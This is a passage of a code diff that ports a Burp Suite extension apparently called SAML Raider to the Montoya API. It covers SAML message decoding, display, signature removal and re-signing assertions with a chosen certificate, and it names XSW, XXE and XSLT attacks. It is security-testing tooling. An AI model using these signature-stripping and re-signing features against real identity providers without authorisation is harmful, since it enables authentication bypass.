@@ -1,5 +1,18 @@
 package application;
 
+import burp.api.montoya.MontoyaApi;
+import burp.api.montoya.core.ByteArray;
+import burp.api.montoya.http.Http;
+import burp.api.montoya.http.message.ContentType;
+import burp.api.montoya.http.message.HttpRequestResponse;
+import burp.api.montoya.http.message.params.HttpParameter;
+import burp.api.montoya.http.message.params.HttpParameterType;
+import burp.api.montoya.http.message.requests.HttpRequest;
+import burp.api.montoya.ui.Selection;
+import burp.api.montoya.ui.editor.RawEditor;
+import burp.api.montoya.ui.editor.extension.ExtensionProvidedHttpRequestEditor;
+import burp.api.montoya.utilities.Base64DecodingOptions;
+import burp.api.montoya.utilities.Base64EncodingOptions;
 import gui.SamlMain;
 import gui.SamlPanelInfo;
 import gui.SignatureHelpWindow;
@@ -24,6 +37,7 @@ import java.net.URLEncoder;
 import java.security.NoSuchAlgorithmException;
 import java.security.cert.CertificateException;
 import java.security.spec.InvalidKeySpecException;
+import java.util.Base64;
 import java.util.HashMap;
 import java.util.List;
 import java.util.Observable;
@@ -39,657 +53,633 @@ import org.w3c.dom.Element;
 import org.w3c.dom.Node;
 import org.w3c.dom.NodeList;
 import org.xml.sax.SAXException;
-import burp.IBurpExtenderCallbacks;
-import burp.IExtensionHelpers;
-import burp.IMessageEditorTab;
-import burp.IParameter;
-import burp.IRequestInfo;
-import burp.IResponseInfo;
-import burp.ITextEditor;
 
-public class SamlTabController implements IMessageEditorTab, Observer {
+import static java.util.Objects.requireNonNull;
 
-	private static final String XML_CERTIFICATE_NOT_FOUND = "X509 Certificate not found";
-	private static final String XSW_ATTACK_APPLIED = "XSW Attack applied";
-	private static final String XXE_CONTENT_APPLIED = "XXE content applied";
-	private static final String XML_NOT_SUITABLE_FOR_XXE = "This XML Message is not suitable for this particular XXE attack";
-	private static final String XSLT_CONTENT_APPLIED = "XSLT content applied";
-	private static final String XML_NOT_SUITABLE_FOR_XLST = "This XML Message is not suitable for this particular XLST attack";
-	private static final String XML_COULD_NOT_SIGN = "Could not sign XML";
-	private static final String XML_COULD_NOT_SERIALIZE = "Could not serialize XML";
-	private static final String XML_NOT_WELL_FORMED = "XML isn't well formed or binding is not supported";
-	private static final String XML_NOT_SUITABLE_FOR_XSW = "This XML Message is not suitable for this particular XSW, is there a signature?";
-	private static final String NO_BROWSER = "Could not open diff in Browser. Path to file was copied to clipboard";
-	private static final String NO_DIFF_TEMP_FILE = "Could not create diff temp file.";
+public class SamlTabController implements ExtensionProvidedHttpRequestEditor, Observer {
 
-	private IExtensionHelpers helpers;
-	private final IBurpExtenderCallbacks callbacks;
-	private XMLHelpers xmlHelpers;
-	private byte[] message;
-	private String orgSAMLMessage;
-	private String SAMLMessage;
-	private boolean isInflated = true;
-	private boolean isGZip = false;
-	private boolean isWSSUrlEncoded = false;
-	private ITextEditor textArea;
-	private ITextEditor textEditorInformation;
-	private SamlMain samlGUI;
-	private boolean editable;
-	private boolean isSOAPMessage;
-	private boolean isWSSMessage;
-	private boolean isSAMLRequest; // otherwise it's a SAMLResponse
-	private String httpMethod; // So URI and POST Binding is supported
-	private CertificateTabController certificateTabController;
-	private XSWHelpers xswHelpers;
-	private HTTPHelpers httpHelpers;
-	private boolean isEdited = false;
-	private boolean isRawMode = false;
+    private static final String XML_CERTIFICATE_NOT_FOUND = "X509 Certificate not found";
+    private static final String XSW_ATTACK_APPLIED = "XSW Attack applied";
+    private static final String XXE_CONTENT_APPLIED = "XXE content applied";
+    private static final String XML_NOT_SUITABLE_FOR_XXE = "This XML Message is not suitable for this particular XXE attack";
+    private static final String XSLT_CONTENT_APPLIED = "XSLT content applied";
+    private static final String XML_NOT_SUITABLE_FOR_XLST = "This XML Message is not suitable for this particular XLST attack";
+    private static final String XML_COULD_NOT_SIGN = "Could not sign XML";
+    private static final String XML_COULD_NOT_SERIALIZE = "Could not serialize XML";
+    private static final String XML_NOT_WELL_FORMED = "XML isn't well formed or binding is not supported";
+    private static final String XML_NOT_SUITABLE_FOR_XSW = "This XML Message is not suitable for this particular XSW, is there a signature?";
+    private static final String NO_BROWSER = "Could not open diff in Browser. Path to file was copied to clipboard";
+    private static final String NO_DIFF_TEMP_FILE = "Could not create diff temp file.";
 
-	public SamlTabController(IBurpExtenderCallbacks callbacks, boolean editable,
-			CertificateTabController certificateTabController) {
-		this.editable = editable;
-		this.callbacks = callbacks;
-		this.helpers = callbacks.getHelpers();
-		samlGUI = new SamlMain(this);
-		textArea = samlGUI.getTextEditorAction();
-		textArea.setEditable(editable);
-		textEditorInformation = samlGUI.getTextEditorInformation();
-		textEditorInformation.setEditable(false);
-		xmlHelpers = new XMLHelpers();
-		xswHelpers = new XSWHelpers();
-		httpHelpers = new HTTPHelpers();
-		this.certificateTabController = certificateTabController;
-		this.certificateTabController.addObserver(this);
-	}
+    private final MontoyaApi api;
+    private final CertificateTabController certificateTabController;
+    private XMLHelpers xmlHelpers;
+    private HttpRequestResponse requestResponse;
+    private String orgSAMLMessage;
+    private String SAMLMessage;
+    private boolean isInflated = true;
+    private boolean isGZip = false;
+    private boolean isWSSUrlEncoded = false;
+    private RawEditor textArea;
+    private RawEditor textEditorInformation;
+    private SamlMain samlGUI;
+    private boolean editable;
+    private boolean isSOAPMessage;
+    private boolean isWSSMessage;
+    private boolean isSAMLRequest; // otherwise it's a SAMLResponse
+    private String httpMethod; // So URI and POST Binding is supported
+    private XSWHelpers xswHelpers;
+    private HTTPHelpers httpHelpers;
+    private boolean isEdited = false;
+    private boolean isRawMode = false;
 
-	@Override
-	public byte[] getMessage() {
-		byte[] byteMessage = message;
-		if (isModified()) {
-			if (isSOAPMessage) {
-				try {
-					// TODO Only working with getString for both documents,
-					// otherwise namespaces and attributes are emptied -.-
-					IResponseInfo responseInfo = helpers.analyzeResponse(byteMessage);
-					int bodyOffset = responseInfo.getBodyOffset();
-					String HTTPHeader = new String(byteMessage, 0, bodyOffset, "UTF-8");
+    public SamlTabController(MontoyaApi api, boolean editable, CertificateTabController certificateTabController) {
+        this.api = requireNonNull(api, "api");
+        this.certificateTabController = requireNonNull(certificateTabController, "certificateTabController");
+        this.editable = editable;
+        samlGUI = new SamlMain(this.api, this);
+        textArea = samlGUI.getTextEditorAction();
+        textArea.setEditable(editable);
+        textEditorInformation = samlGUI.getTextEditorInformation();
+        textEditorInformation.setEditable(false);
+        xmlHelpers = new XMLHelpers();
+        xswHelpers = new XSWHelpers();
+        httpHelpers = new HTTPHelpers();
+        this.certificateTabController.addObserver(this);
+    }
 
-					String soapMessage = new String(byteMessage, bodyOffset, byteMessage.length - bodyOffset, "UTF-8");
-					Document soapDocument = xmlHelpers.getXMLDocumentOfSAMLMessage(soapMessage);
-					Element soapBody = xmlHelpers.getSOAPBody(soapDocument);
-					xmlHelpers.getString(soapDocument);
-					Document samlDocumentEdited = xmlHelpers.getXMLDocumentOfSAMLMessage(SAMLMessage);
-					xmlHelpers.getString(samlDocumentEdited);
-					Element samlResponse = (Element) samlDocumentEdited.getFirstChild();
-					soapDocument.adoptNode(samlResponse);
-					Element soapFirstChildOfBody = (Element) soapBody.getFirstChild();
-					soapBody.replaceChild(samlResponse, soapFirstChildOfBody);
-					String wholeMessage = HTTPHeader + xmlHelpers.getString(soapDocument);
-					byteMessage = wholeMessage.getBytes("UTF-8");
-				} catch (IOException e) {
-				} catch (SAXException e) {
-					setInfoMessageText(XML_NOT_WELL_FORMED);
-				}
-			} else {
-				String textMessage = null;
+    @Override
+    public HttpRequest getRequest() {
+        HttpRequest request = requestResponse.request();
+        if (isModified()) {
+            if (isSOAPMessage) {
+                try {
+                    // TODO Only working with getString for both documents,
+                    // otherwise namespaces and attributes are emptied -.-
+                    var response = this.requestResponse.response();
+                    int bodyOffset = response.bodyOffset();
+                    var byteMessage = this.requestResponse.response().toByteArray().getBytes();
+                    String HTTPHeader = new String(byteMessage, 0, bodyOffset, "UTF-8");
 
-				if (isRawMode){
-					textMessage = new String(textArea.getText());
-				}
-				else {
-					try {
-						textMessage = xmlHelpers
-								.getStringOfDocument(xmlHelpers.getXMLDocumentOfSAMLMessage(new String(textArea.getText())), 0, true);
-					} catch (IOException e) {
-						setInfoMessageText(XML_COULD_NOT_SERIALIZE);
-					} catch (SAXException e) {
-						setInfoMessageText(XML_NOT_WELL_FORMED);
-					}
-				}
+                    String soapMessage = requestResponse.response().bodyToString();
+                    Document soapDocument = xmlHelpers.getXMLDocumentOfSAMLMessage(soapMessage);
+                    Element soapBody = xmlHelpers.getSOAPBody(soapDocument);
+                    xmlHelpers.getString(soapDocument);
+                    Document samlDocumentEdited = xmlHelpers.getXMLDocumentOfSAMLMessage(SAMLMessage);
+                    xmlHelpers.getString(samlDocumentEdited);
+                    Element samlResponse = (Element) samlDocumentEdited.getFirstChild();
+                    soapDocument.adoptNode(samlResponse);
+                    Element soapFirstChildOfBody = (Element) soapBody.getFirstChild();
+                    soapBody.replaceChild(samlResponse, soapFirstChildOfBody);
+                    String wholeMessage = HTTPHeader + xmlHelpers.getString(soapDocument);
+                    byteMessage = wholeMessage.getBytes("UTF-8");
+                    request = HttpRequest.httpRequest(ByteArray.byteArray(byteMessage));
+                } catch (IOException e) {
+                } catch (SAXException e) {
+                    setInfoMessageText(XML_NOT_WELL_FORMED);
+                }
+            } else {
+                String textMessage = null;
 
-				String parameterToUpdate;
-				if (isSAMLRequest) {
-					parameterToUpdate = certificateTabController.getSamlRequestParameterName();
-				} else {
-					parameterToUpdate = certificateTabController.getSamlResponseParameterName();
-				}
+                if (isRawMode) {
+                    textMessage = new String(textArea.getContents().toString());
+                } else {
+                    try {
+                        textMessage = xmlHelpers
+                                .getStringOfDocument(xmlHelpers.getXMLDocumentOfSAMLMessage(textArea.getContents().toString()), 0, true);
+                    } catch (IOException e) {
+                        setInfoMessageText(XML_COULD_NOT_SERIALIZE);
+                    } catch (SAXException e) {
+                        setInfoMessageText(XML_NOT_WELL_FORMED);
+                    }
+                }
 
-				if (isWSSMessage) {
-					parameterToUpdate = "wresult";
-				}
+                String parameterToUpdate;
+                if (isSAMLRequest) {
+                    parameterToUpdate = certificateTabController.getSamlRequestParameterName();
+                } else {
+                    parameterToUpdate = certificateTabController.getSamlResponseParameterName();
+                }
 
-				byte parameterType;
-				if (httpMethod.equals("GET")) {
-					parameterType = IParameter.PARAM_URL;
-				} else {
-					parameterType = IParameter.PARAM_BODY;
-				}
-				IParameter newParameter = helpers.buildParameter(parameterToUpdate, getEncodedSAMLMessage(textMessage),
-						parameterType);
+                if (isWSSMessage) {
+                    parameterToUpdate = "wresult";
+                }
 
-				byteMessage = helpers.updateParameter(byteMessage, newParameter);
-			}
-		}
-		return byteMessage;
-	}
+                HttpParameterType parameterType;
+                if (httpMethod.equals("GET")) {
+                    parameterType = HttpParameterType.URL;
+                } else {
+                    parameterType = HttpParameterType.BODY;
+                }
 
-	@Override
-	public byte[] getSelectedData() {
-		return textArea.getSelectedText();
-	}
+                HttpParameter newParameter = HttpParameter.parameter(parameterToUpdate, getEncodedSAMLMessage(textMessage), parameterType);
+                request = request.withUpdatedParameters(newParameter);
+            }
+        }
+        return request;
+    }
 
-	@Override
-	public String getTabCaption() {
-		return "SAML Raider";
-	}
+    @Override
+    public Selection selectedData() {
+        return textArea.selection().orElse(null);
+    }
 
-	@Override
-	public Component getUiComponent() {
-		return samlGUI;
-	}
+    @Override
+    public String caption() {
+        return "SAML Raider";
+    }
 
-	@Override
-	public boolean isEnabled(byte[] content, boolean isRequest) {
-		return isRequest && isSAMLMessage(content);
-	}
+    @Override
+    public Component uiComponent() {
+        return samlGUI;
+    }
 
-	private boolean isSAMLMessage(byte[] content) {
-		IRequestInfo info = helpers.analyzeRequest(content);
-		httpMethod = helpers.analyzeRequest(content).getMethod();
-		if (info.getContentType() == IRequestInfo.CONTENT_TYPE_XML) {
-			isSOAPMessage = true;
-			try {
-				IRequestInfo requestInfo = helpers.analyzeRequest(content);
-				int bodyOffset = requestInfo.getBodyOffset();
-				String soapMessage = new String(content, bodyOffset, content.length - bodyOffset, "UTF-8");
-				Document document = xmlHelpers.getXMLDocumentOfSAMLMessage(soapMessage);
-				return xmlHelpers.getAssertions(document).getLength() != 0
-						|| xmlHelpers.getEncryptedAssertions(document).getLength() != 0;
-			} catch (UnsupportedEncodingException e) {
-			} catch (SAXException e) {
-				e.printStackTrace();
-				return false;
-			}
-		}
-		// WSS Security
-		else if (null != helpers.getRequestParameter(content, "wresult")) {
-			try {
-				IRequestInfo requestInfo = helpers.analyzeRequest(content);
-				isWSSUrlEncoded = requestInfo.getContentType() == IRequestInfo.CONTENT_TYPE_URL_ENCODED;
-				isWSSMessage = true;
-				IParameter parameter = helpers.getRequestParameter(content, "wresult");
-				String wssMessage = getDecodedSAMLMessage(parameter.getValue());
-				Document document;
-				document = xmlHelpers.getXMLDocumentOfSAMLMessage(wssMessage);
-				return xmlHelpers.getAssertions(document).getLength() != 0
-						|| xmlHelpers.getEncryptedAssertions(document).getLength() != 0;
-			} catch (SAXException e) {
-				e.printStackTrace();
-				return false;
-			}
-		} else {
-			isWSSMessage = false;
-			isSOAPMessage = false;
+    @Override
+    public boolean isEnabledFor(HttpRequestResponse requestResponse) {
+        return isSAMLMessage(requestResponse.request());
+    }
 
-			IParameter requestParameter;
-			requestParameter = helpers.getRequestParameter(content, certificateTabController.getSamlResponseParameterName());
-			if (requestParameter != null) {
-				isSAMLRequest = false;
-				return true;
-			}
-			requestParameter = helpers.getRequestParameter(content, certificateTabController.getSamlRequestParameterName());
-			if (requestParameter != null) {
-				isSAMLRequest = true;
-				return true;
-			}
-		}
-		return false;
-	}
+    private boolean isSAMLMessage(HttpRequest request) {
+        httpMethod = request.method();
+        if (request.contentType() == ContentType.XML) {
+            isSOAPMessage = true;
+            try {
+                String soapMessage = request.bodyToString();
+                Document document = xmlHelpers.getXMLDocumentOfSAMLMessage(soapMessage);
+                return xmlHelpers.getAssertions(document).getLength() != 0 || xmlHelpers.getEncryptedAssertions(document).getLength() != 0;
+            } catch (SAXException e) {
+                e.printStackTrace();
+                return false;
+            }
+        }
+        // WSS Security
+        else if (request.hasParameter("wresult", HttpParameterType.BODY)) {
+            try {
+                isWSSUrlEncoded = request.contentType() == ContentType.URL_ENCODED;
+                isWSSMessage = true;
+                String parameterValue = request.parameterValue("wresult", HttpParameterType.BODY);
+                String wssMessage = getDecodedSAMLMessage(parameterValue);
+                Document document;
+                document = xmlHelpers.getXMLDocumentOfSAMLMessage(wssMessage);
+                return xmlHelpers.getAssertions(document).getLength() != 0 || xmlHelpers.getEncryptedAssertions(document).getLength() != 0;
+            } catch (SAXException e) {
+                e.printStackTrace();
+                return false;
+            }
+        } else {
+            isWSSMessage = false;
+            isSOAPMessage = false;
 
-	@Override
-	public boolean isModified() {
-		return textArea.isTextModified() || isEdited;
-	}
+            String requestParameter;
+            requestParameter = request.parameterValue(certificateTabController.getSamlResponseParameterName(), HttpParameterType.BODY);
+            if (requestParameter != null) {
+                isSAMLRequest = false;
+                return true;
+            }
+            requestParameter = request.parameterValue(certificateTabController.getSamlRequestParameterName(), HttpParameterType.BODY);
+            if (requestParameter != null) {
+                isSAMLRequest = true;
+                return true;
+            }
+        }
+        return false;
+    }
 
-	@Override
-	public void setMessage(byte[] content, boolean isRequest) {
-		resetInfoMessageText();
-		isEdited = false;
-		if (content == null) {
-			textArea.setText(null);
-			textArea.setEditable(false);
-			setGUIEditable(false);
-			resetInformationDisplay();
-		} else {
-			message = content;
-			try {
-				if (isSOAPMessage) {
-					IResponseInfo responseInfo = helpers.analyzeResponse(content);
-					int bodyOffset = responseInfo.getBodyOffset();
-					String soapMessage = new String(content, bodyOffset, content.length - bodyOffset, "UTF-8");
-					Document document = xmlHelpers.getXMLDocumentOfSAMLMessage(soapMessage);
-					Document documentSAML = xmlHelpers.getSAMLResponseOfSOAP(document);
-					SAMLMessage = xmlHelpers.getStringOfDocument(documentSAML, 0, false);
-				} else if (isWSSMessage) {
-					IParameter parameter = helpers.getRequestParameter(content, "wresult");
-					SAMLMessage = getDecodedSAMLMessage(parameter.getValue());
-				} else {
-					IParameter parameter;
+    @Override
+    public boolean isModified() {
+        return textArea.isModified() || isEdited;
+    }
 
-					if (isSAMLRequest) {
-						parameter = helpers.getRequestParameter(content, certificateTabController.getSamlRequestParameterName());
-					} else {
-						parameter = helpers.getRequestParameter(content, certificateTabController.getSamlResponseParameterName());
-					}
+    @Override
+    public void setRequestResponse(HttpRequestResponse requestResponse) {
+        this.requestResponse = requestResponse;
+        resetInfoMessageText();
+        isEdited = false;
+        if (requestResponse == null) {
+            textArea.setContents(null);
+            textArea.setEditable(false);
+            setGUIEditable(false);
+            resetInformationDisplay();
+        } else {
+            try {
+                if (isSOAPMessage) {
+                    String soapMessage = requestResponse.response().bodyToString();
+                    Document document = xmlHelpers.getXMLDocumentOfSAMLMessage(soapMessage);
+                    Document documentSAML = xmlHelpers.getSAMLResponseOfSOAP(document);
+                    SAMLMessage = xmlHelpers.getStringOfDocument(documentSAML, 0, false);
+                } else if (isWSSMessage) {
+                    var parameterValue = requestResponse.request().parameterValue("wresult", HttpParameterType.BODY);
+                    SAMLMessage = getDecodedSAMLMessage(parameterValue);
+                } else {
+                    String parameterValue;
 
-					SAMLMessage = getDecodedSAMLMessage(parameter.getValue());
-				}
+                    if (isSAMLRequest) {
+                        parameterValue = requestResponse.request().parameterValue(certificateTabController.getSamlRequestParameterName(), HttpParameterType.BODY);
+                    } else {
+                        parameterValue = requestResponse.request().parameterValue(certificateTabController.getSamlResponseParameterName(), HttpParameterType.BODY);
+                    }
 
-			} catch (IOException e) {
-				e.printStackTrace();
-				setInfoMessageText(XML_COULD_NOT_SERIALIZE);
-			} catch (SAXException e) {
-				e.printStackTrace();
-				setInfoMessageText(XML_NOT_WELL_FORMED);
-				SAMLMessage = "<error>" + XML_NOT_WELL_FORMED + "</error>";
-			} catch (ParserConfigurationException e) {
-				e.printStackTrace();
-			}
+                    SAMLMessage = getDecodedSAMLMessage(parameterValue);
+                }
 
-			setInformationDisplay();
-			updateCertificateList();
-			updateXSWList();
-			orgSAMLMessage = SAMLMessage;
-			textArea.setText(SAMLMessage.getBytes());
-			textArea.setEditable(editable);
+            } catch (IOException e) {
+                e.printStackTrace();
+                setInfoMessageText(XML_COULD_NOT_SERIALIZE);
+            } catch (SAXException e) {
+                e.printStackTrace();
+                setInfoMessageText(XML_NOT_WELL_FORMED);
+                SAMLMessage = "<error>" + XML_NOT_WELL_FORMED + "</error>";
+            } catch (ParserConfigurationException e) {
+                e.printStackTrace();
+            }
 
-			setGUIEditable(editable);
-		}
-	}
+            setInformationDisplay();
+            updateCertificateList();
+            updateXSWList();
+            orgSAMLMessage = SAMLMessage;
+            textArea.setContents(ByteArray.byteArray(SAMLMessage));
+            textArea.setEditable(editable);
 
-	private void setInformationDisplay() {
-		SamlPanelInfo infoPanel = samlGUI.getInfoPanel();
-		infoPanel.clearAll();
+            setGUIEditable(editable);
+        }
+    }
 
-		try {
-			Document document = xmlHelpers.getXMLDocumentOfSAMLMessage(SAMLMessage);
-			NodeList assertions = xmlHelpers.getAssertions(document);
-			if (assertions.getLength() > 0) {
-				Node assertion = assertions.item(0);
-				infoPanel.setIssuer(xmlHelpers.getIssuer(document));
-				infoPanel.setConditionNotBefore(xmlHelpers.getConditionNotBefore(assertion));
-				infoPanel.setConditionNotAfter(xmlHelpers.getConditionNotAfter(assertion));
-				infoPanel.setSubjectConfNotBefore(xmlHelpers.getSubjectConfNotBefore(assertion));
-				infoPanel.setSubjectConfNotAfter(xmlHelpers.getSubjectConfNotAfter(assertion));
-				infoPanel.setSignatureAlgorithm(xmlHelpers.getSignatureAlgorithm(assertion));
-				infoPanel.setDigestAlgorithm(xmlHelpers.getDigestAlgorithm(assertion));
-				textEditorInformation.setText(xmlHelpers.getStringOfDocument(xmlHelpers.getXMLDocumentOfSAMLMessage(SAMLMessage), 2, true).getBytes());
-			} else {
-				assertions = xmlHelpers.getEncryptedAssertions(document);
-				Node assertion = assertions.item(0);
-				infoPanel.setEncryptionAlgorithm(xmlHelpers.getEncryptionMethod(assertion));
-			}
-		} catch (SAXException|IOException e) {
-			setInfoMessageText(XML_NOT_WELL_FORMED);
-		}
-	}
+    private void setInformationDisplay() {
+        SamlPanelInfo infoPanel = samlGUI.getInfoPanel();
+        infoPanel.clearAll();
 
-	private void resetInformationDisplay() {
-		SamlPanelInfo infoPanel = samlGUI.getInfoPanel();
-		infoPanel.setIssuer("");
-		infoPanel.setConditionNotBefore("");
-		infoPanel.setConditionNotAfter("");
-		infoPanel.setSubjectConfNotBefore("");
-		infoPanel.setSubjectConfNotAfter("");
-		infoPanel.setSignatureAlgorithm("");
-		infoPanel.setDigestAlgorithm("");
-		infoPanel.setEncryptionAlgorithm("");
-		textEditorInformation.setText("".getBytes());
-	}
+        try {
+            Document document = xmlHelpers.getXMLDocumentOfSAMLMessage(SAMLMessage);
+            NodeList assertions = xmlHelpers.getAssertions(document);
+            if (assertions.getLength() > 0) {
+                Node assertion = assertions.item(0);
+                infoPanel.setIssuer(xmlHelpers.getIssuer(document));
+                infoPanel.setConditionNotBefore(xmlHelpers.getConditionNotBefore(assertion));
+                infoPanel.setConditionNotAfter(xmlHelpers.getConditionNotAfter(assertion));
+                infoPanel.setSubjectConfNotBefore(xmlHelpers.getSubjectConfNotBefore(assertion));
+                infoPanel.setSubjectConfNotAfter(xmlHelpers.getSubjectConfNotAfter(assertion));
+                infoPanel.setSignatureAlgorithm(xmlHelpers.getSignatureAlgorithm(assertion));
+                infoPanel.setDigestAlgorithm(xmlHelpers.getDigestAlgorithm(assertion));
+                textEditorInformation.setContents(ByteArray.byteArray(xmlHelpers.getStringOfDocument(xmlHelpers.getXMLDocumentOfSAMLMessage(SAMLMessage), 2, true).getBytes()));
+            } else {
+                assertions = xmlHelpers.getEncryptedAssertions(document);
+                Node assertion = assertions.item(0);
+                infoPanel.setEncryptionAlgorithm(xmlHelpers.getEncryptionMethod(assertion));
+            }
+        } catch (SAXException | IOException e) {
+            setInfoMessageText(XML_NOT_WELL_FORMED);
+        }
+    }
 
-	public String getEncodedSAMLMessage(String message) {
-		byte[] byteMessage;
-		try {
-			if (isWSSMessage) {
-				if (isWSSUrlEncoded) {
-					return URLEncoder.encode(message, "UTF-8");
-				} else {
-					return message;
-				}
-			}
-			byteMessage = message.getBytes("UTF-8");
-			if (isInflated) {
-				try {
-					byteMessage = httpHelpers.compress(byteMessage, isGZip);
-				} catch (IOException e) {
-				}
-			}
-			String base64Encoded = helpers.base64Encode(byteMessage);
-			return URLEncoder.encode(base64Encoded, "UTF-8");
-		} catch (UnsupportedEncodingException e1) {
-		}
-		return null;
-	}
+    private void resetInformationDisplay() {
+        SamlPanelInfo infoPanel = samlGUI.getInfoPanel();
+        infoPanel.setIssuer("");
+        infoPanel.setConditionNotBefore("");
+        infoPanel.setConditionNotAfter("");
+        infoPanel.setSubjectConfNotBefore("");
+        infoPanel.setSubjectConfNotAfter("");
+        infoPanel.setSignatureAlgorithm("");
+        infoPanel.setDigestAlgorithm("");
+        infoPanel.setEncryptionAlgorithm("");
+        textEditorInformation.setContents(ByteArray.byteArray(""));
+    }
 
-	public String getDecodedSAMLMessage(String message) {
+    public String getEncodedSAMLMessage(String message) {
+        byte[] byteMessage;
+        try {
+            if (isWSSMessage) {
+                if (isWSSUrlEncoded) {
+                    return URLEncoder.encode(message, "UTF-8");
+                } else {
+                    return message;
+                }
+            }
+            byteMessage = message.getBytes("UTF-8");
+            if (isInflated) {
+                try {
+                    byteMessage = httpHelpers.compress(byteMessage, isGZip);
+                } catch (IOException e) {
+                }
+            }
+            String base64Encoded = Base64.getEncoder().encodeToString(byteMessage);
+            return URLEncoder.encode(base64Encoded, "UTF-8");
+        } catch (UnsupportedEncodingException e1) {
+        }
+        return null;
+    }
 
-		if (isWSSMessage) {
-			if (isWSSUrlEncoded) {
-				return helpers.urlDecode(message);
-			} else {
-				return message;
-			}
-		}
+    public String getDecodedSAMLMessage(String message) {
+        if (isWSSMessage) {
+            if (isWSSUrlEncoded) {
+                return this.api.utilities().urlUtils().decode(message);
+            } else {
+                return message;
+            }
+        }
 
-		String urlDecoded = helpers.urlDecode(message);
-		urlDecoded = urlDecoded.replaceAll("\\R", "");
-		byte[] base64Decoded = helpers.base64Decode(urlDecoded);
+        String urlDecoded = this.api.utilities().urlUtils().decode(message);
+        urlDecoded = urlDecoded.replaceAll("\\R", "");
+        byte[] base64Decoded = Base64.getDecoder().decode(urlDecoded);
 
-		isInflated = true;
-		isGZip = true;
+        isInflated = true;
+        isGZip = true;
 
-		// try normal Zip Inflate
-		try {
-			byte[] inflated = httpHelpers.decompress(base64Decoded, true);
-			return new String(inflated, "UTF-8");
-		} catch (IOException e) {
-		} catch (DataFormatException e) {
-			isGZip = false;
-		}
+        // try normal Zip Inflate
+        try {
+            byte[] inflated = httpHelpers.decompress(base64Decoded, true);
+            return new String(inflated, "UTF-8");
+        } catch (IOException e) {
+        } catch (DataFormatException e) {
+            isGZip = false;
+        }
 
-		// try Gzip Inflate
-		try {
-			byte[] inflated = httpHelpers.decompress(base64Decoded, false);
-			return new String(inflated, "UTF-8");
-		} catch (IOException e) {
-		} catch (DataFormatException e) {
-			isInflated = false;
-		}
+        // try Gzip Inflate
+        try {
+            byte[] inflated = httpHelpers.decompress(base64Decoded, false);
+            return new String(inflated, "UTF-8");
+        } catch (IOException e) {
+        } catch (DataFormatException e) {
+            isInflated = false;
+        }
 
-		try {
-			return new String(base64Decoded, "UTF-8");
-		} catch (UnsupportedEncodingException e) {
-		}
-		return null;
-	}
+        try {
+            return new String(base64Decoded, "UTF-8");
+        } catch (UnsupportedEncodingException e) {
+        }
+        return null;
+    }
 
-	public void removeSignature() {
-		resetInfoMessageText();
-		try {
-			Document document = xmlHelpers.getXMLDocumentOfSAMLMessage(new String(textArea.getText()));
-			if (xmlHelpers.removeAllSignatures(document) > 0) {
-				SAMLMessage = xmlHelpers.getStringOfDocument(document, 2, true);
-				textArea.setText(SAMLMessage.getBytes());
-				isEdited = true;
-				setRawMode(false);
-				setInfoMessageText("Message signature successful removed");
-			} else {
-				setInfoMessageText("No Signatures available to remove");
-			}
-		} catch (SAXException e1) {
-			setInfoMessageText(XML_NOT_WELL_FORMED);
-		} catch (IOException e) {
-			setInfoMessageText(XML_COULD_NOT_SERIALIZE);
-		}
-	}
+    public void removeSignature() {
+        resetInfoMessageText();
+        try {
+            Document document = xmlHelpers.getXMLDocumentOfSAMLMessage(textArea.getContents().toString());
+            if (xmlHelpers.removeAllSignatures(document) > 0) {
+                SAMLMessage = xmlHelpers.getStringOfDocument(document, 2, true);
+                textArea.setContents(ByteArray.byteArray(SAMLMessage));
+                isEdited = true;
+                setRawMode(false);
+                setInfoMessageText("Message signature successful removed");
+            } else {
+                setInfoMessageText("No Signatures available to remove");
+            }
+        } catch (SAXException e1) {
+            setInfoMessageText(XML_NOT_WELL_FORMED);
+        } catch (IOException e) {
+            setInfoMessageText(XML_COULD_NOT_SERIALIZE);
+        }
+    }
 
-	public void resetMessage() {
-		if(isRawMode){
-			SAMLMessage = orgSAMLMessage;
-		}
-		textArea.setText(SAMLMessage.getBytes());
-		isEdited = false;
-	}
+    public void resetMessage() {
+        if (isRawMode) {
+            SAMLMessage = orgSAMLMessage;
+        }
+        textArea.setContents(ByteArray.byteArray(SAMLMessage));
+        isEdited = false;
+    }
 
-	public void setRawMode(boolean rawModeEnabled){
-		isRawMode = rawModeEnabled;
-		isEdited = true;
-		samlGUI.getActionPanel().setRawModeEnabled(rawModeEnabled);
-	}
+    public void setRawMode(boolean rawModeEnabled) {
+        isRawMode = rawModeEnabled;
+        isEdited = true;
+        samlGUI.getActionPanel().setRawModeEnabled(rawModeEnabled);
+    }
 
-	public void resignAssertion() {
-		try {
-			resetInfoMessageText();
-			BurpCertificate cert = samlGUI.getActionPanel().getSelectedCertificate();
-			if (cert != null) {
-				setInfoMessageText("Signing...");
-				Document document = xmlHelpers.getXMLDocumentOfSAMLMessage(new String(textArea.getText()));
-				NodeList assertions = xmlHelpers.getAssertions(document);
-				String signAlgorithm = xmlHelpers.getSignatureAlgorithm(assertions.item(0));
-				String digestAlgorithm = xmlHelpers.getDigestAlgorithm(assertions.item(0));
+    public void resignAssertion() {
+        try {
+            resetInfoMessageText();
+            BurpCertificate cert = samlGUI.getActionPanel().getSelectedCertificate();
+            if (cert != null) {
+                setInfoMessageText("Signing...");
+                Document document = xmlHelpers.getXMLDocumentOfSAMLMessage(textArea.getContents().toString());
+                NodeList assertions = xmlHelpers.getAssertions(document);
+                String signAlgorithm = xmlHelpers.getSignatureAlgorithm(assertions.item(0));
+                String digestAlgorithm = xmlHelpers.getDigestAlgorithm(assertions.item(0));
 
-				xmlHelpers.removeAllSignatures(document);
-				String string = xmlHelpers.getString(document);
-				Document doc = xmlHelpers.getXMLDocumentOfSAMLMessage(string);
-				xmlHelpers.removeEmptyTags(doc);
-				xmlHelpers.signAssertion(doc, signAlgorithm, digestAlgorithm, cert.getCertificate(),
-						cert.getPrivateKey());
-				SAMLMessage = xmlHelpers.getStringOfDocument(doc, 2, true);
-				textArea.setText(SAMLMessage.getBytes());
-				isEdited = true;
-				setRawMode(false);
-				setInfoMessageText("Assertions successfully signed");
-			} else {
-				setInfoMessageText("no certificate chosen to sign");
-			}
-		} catch (SAXException e) {
-			setInfoMessageText(XML_NOT_WELL_FORMED);
-		} catch (IOException e) {
-			setInfoMessageText(XML_COULD_NOT_SERIALIZE);
-		} catch (Exception e) {
-			setInfoMessageText(XML_COULD_NOT_SIGN);
-		}
-	}
+                xmlHelpers.removeAllSignatures(document);
+                String string = xmlHelpers.getString(document);
+                Document doc = xmlHelpers.getXMLDocumentOfSAMLMessage(string);
